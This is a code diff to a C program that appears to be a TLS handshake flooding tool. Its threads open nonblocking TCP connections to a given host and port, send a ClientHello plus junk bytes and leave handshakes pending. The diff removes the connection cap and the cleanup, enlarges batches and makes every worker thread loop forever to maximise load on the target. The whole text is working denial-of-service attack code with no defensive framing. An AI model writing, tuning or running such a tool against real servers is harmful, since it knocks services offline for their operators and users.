@@ -14,9 +14,9 @@
 #include <sys/resource.h>
 #include <stdatomic.h>
 
-#define DESIRED_NOFILE 1000000000UL  // Adjust as necessary for your system
-#define BATCH_SIZE 256            // Number of connections created per batch in each thread
-#define MAX_EVENTS 4096           // Maximum events returned by epoll_wait
+#define DESIRED_NOFILE 1000000000UL   // Adjust as necessary for your system
+#define BATCH_SIZE 4096            // Increased batch size for heavier load
+#define MAX_EVENTS 1024            // Maximum events returned by epoll_wait
 
 #define BANNER "\n\033[1;31m" \
 "                            ,-.\n" \
@@ -46,7 +46,6 @@ static const unsigned char junkData[4096] = { 0 };
 // Global atomic counters for statistics
 atomic_long total_connections = ATOMIC_VAR_INIT(0);
 atomic_long pending_handshakes = ATOMIC_VAR_INIT(0);
-atomic_int finished_threads = ATOMIC_VAR_INIT(0);
 
 // Global target address (supports IPv4/IPv6)
 struct sockaddr_storage target_addr;
@@ -85,10 +84,9 @@ typedef struct {
     size_t sent_bytes; // Amount sent in current payload
 } connection_t;
 
-// Thread configuration: each thread creates a fixed number of connections
+// Thread configuration: each thread continuously creates connections
 typedef struct {
     int thread_id;
-    long max_connections;  // Maximum connections to create in this thread
 } ThreadConfig;
 
 // Worker thread function employing epoll for asynchronous connection and data send
@@ -101,12 +99,11 @@ void *worker_thread(void *arg) {
     }
     
     struct epoll_event events[MAX_EVENTS];
-    long created = 0;
     
-    // Loop until the thread has created the desired number of connections
-    while (created < config->max_connections) {
-        // Create a batch of connections
-        for (int i = 0; i < BATCH_SIZE && created < config->max_connections; i++) {
+    // Run indefinitely to create as heavy a load as possible
+    while (1) {
+        // Create a batch of new connections
+        for (int i = 0; i < BATCH_SIZE; i++) {
             int sock = socket(target_addr.ss_family, SOCK_STREAM, 0);
             if (sock < 0)
                 continue;
@@ -136,12 +133,11 @@ void *worker_thread(void *arg) {
                 free(conn);
                 continue;
             }
-            created++;
             atomic_fetch_add(&total_connections, 1);
         }
         
-        // Process epoll events with a short timeout
-        int nfds = epoll_wait(epoll_fd, events, MAX_EVENTS, 100);
+        // Process epoll events with a very short timeout for responsiveness
+        int nfds = epoll_wait(epoll_fd, events, MAX_EVENTS, 10);
         for (int i = 0; i < nfds; i++) {
             connection_t *conn = (connection_t *) events[i].data.ptr;
             // STATE_CONNECTING: Check if connection completed
@@ -196,63 +192,7 @@ void *worker_thread(void *arg) {
         }
     }
     
-    // Process any remaining events until no more are pending
-    while (1) {
-        int nfds = epoll_wait(epoll_fd, events, MAX_EVENTS, 100);
-        if (nfds <= 0)
-            break;
-        for (int i = 0; i < nfds; i++) {
-            connection_t *conn = (connection_t *) events[i].data.ptr;
-            if (conn->state == STATE_CONNECTING) {
-                int err = 0;
-                socklen_t len = sizeof(err);
-                if (getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &len) < 0 || err != 0) {
-                    epoll_ctl(epoll_fd, EPOLL_CTL_DEL, conn->fd, NULL);
-                    close(conn->fd);
-                    free(conn);
-                    continue;
-                }
-                conn->state = STATE_CLIENTHELLO;
-                conn->sent_bytes = 0;
-            }
-            if (conn->state == STATE_CLIENTHELLO) {
-                ssize_t n = send(conn->fd, clientHello + conn->sent_bytes, CLIENTHELLO_SIZE - conn->sent_bytes, 0);
-                if (n > 0) {
-                    conn->sent_bytes += n;
-                    if (conn->sent_bytes == CLIENTHELLO_SIZE) {
-                        conn->state = STATE_JUNK;
-                        conn->sent_bytes = 0;
-                    }
-                } else if (n < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
-                    epoll_ctl(epoll_fd, EPOLL_CTL_DEL, conn->fd, NULL);
-                    close(conn->fd);
-                    free(conn);
-                    continue;
-                }
-            }
-            if (conn->state == STATE_JUNK) {
-                ssize_t n = send(conn->fd, junkData + conn->sent_bytes, JUNK_SIZE - conn->sent_bytes, 0);
-                if (n > 0) {
-                    conn->sent_bytes += n;
-                    if (conn->sent_bytes == JUNK_SIZE) {
-                        conn->state = STATE_DONE;
-                        atomic_fetch_add(&pending_handshakes, 1);
-                        epoll_ctl(epoll_fd, EPOLL_CTL_DEL, conn->fd, NULL);
-                        free(conn);
-                        continue;
-                    }
-                } else if (n < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
-                    epoll_ctl(epoll_fd, EPOLL_CTL_DEL, conn->fd, NULL);
-                    close(conn->fd);
-                    free(conn);
-                    continue;
-                }
-            }
-        }
-    }
-    
     close(epoll_fd);
-    atomic_fetch_add(&finished_threads, 1);
     pthread_exit(NULL);
 }
 
@@ -260,7 +200,7 @@ int main(int argc, char *argv[]) {
     printf(BANNER);
     
     if (argc < 4) {
-        fprintf(stderr, "Usage: %s <IP/HOST> <PORT> <THREADS> [max_connections_per_thread]\n", argv[0]);
+        fprintf(stderr, "Usage: %s <IP/HOST> <PORT> <THREADS>\n", argv[0]);
         return EXIT_FAILURE;
     }
     
@@ -288,11 +228,6 @@ int main(int argc, char *argv[]) {
     resolve_target(argv[1], argv[2]);
     
     int thread_count = atoi(argv[3]);
-    long max_conn_per_thread = 50000;
-    if (argc >= 5) {
-        max_conn_per_thread = atol(argv[4]);
-    }
-    
     pthread_t *threads = malloc(thread_count * sizeof(pthread_t));
     ThreadConfig *configs = malloc(thread_count * sizeof(ThreadConfig));
     if (!threads || !configs) {
@@ -300,17 +235,16 @@ int main(int argc, char *argv[]) {
         return EXIT_FAILURE;
     }
     
-    // Create worker threads
+    // Create worker threads that run indefinitely
     for (int i = 0; i < thread_count; i++) {
         configs[i].thread_id = i;
-        configs[i].max_connections = max_conn_per_thread;
         if (pthread_create(&threads[i], NULL, worker_thread, &configs[i]) != 0) {
             perror("Thread creation failed");
         }
     }
     
-    // Continuous feedback loop with original blue-colored stats output
-    while (atomic_load(&finished_threads) < thread_count) {
+    // Continuous feedback loop with blue-colored stats output
+    while (1) {
         printf("\r\033[34m[+] Total Connections: %ld | Pending Handshakes: %ld | Threads: %d\033[0m",
                atomic_load(&total_connections),
                atomic_load(&pending_handshakes),
@@ -322,7 +256,6 @@ int main(int argc, char *argv[]) {
     for (int i = 0; i < thread_count; i++)
         pthread_join(threads[i], NULL);
     
-    printf("\n\033[32m[+] Attack complete: all connections are pending!\033[0m\n");
     free(threads);
     free(configs);
     return EXIT_SUCCESS;
